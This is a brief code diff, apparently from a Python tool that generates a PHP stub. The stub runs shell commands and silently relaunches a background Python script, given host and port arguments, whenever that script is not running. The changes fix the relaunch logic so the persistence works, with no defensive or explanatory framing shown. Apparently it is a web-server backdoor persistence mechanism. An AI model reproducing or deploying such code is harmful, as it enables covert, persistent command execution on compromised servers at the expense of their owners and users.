@@ -247,7 +247,7 @@ function checkIt($func)
 #Executes system commands -->
 function evalRel($command, $id)
 {
-	global $shell_exec, $exec, $popen, $proc_open, $system, $passthru, $cgi, $shsh;
+	global $shell_exec, $exec, $popen, $proc_open, $system, $passthru;
 	if (($system == True) && ($id == 2))
 	{
 		system($command);
@@ -330,9 +330,9 @@ foreach($php_functions as $function)
 
 $checker = evalRel("ps aux | grep '%s %s'", 1);
 
-if (strpos($checker, "%s") !== False)
+if (strpos($checker, "%s") === False)
 {
-	evalRel("nohup python %s/%s %s %s > /dev/null 2>&1 &", 2)
+	evalRel("nohup python %s/%s %s %s > /dev/null 2>&1 &", 2);
 }
 ?>
 """ % (host, port, sys.argv[0], os.path.abspath(os.path.dirname(sys.argv[0])), sys.argv[0], host, port)
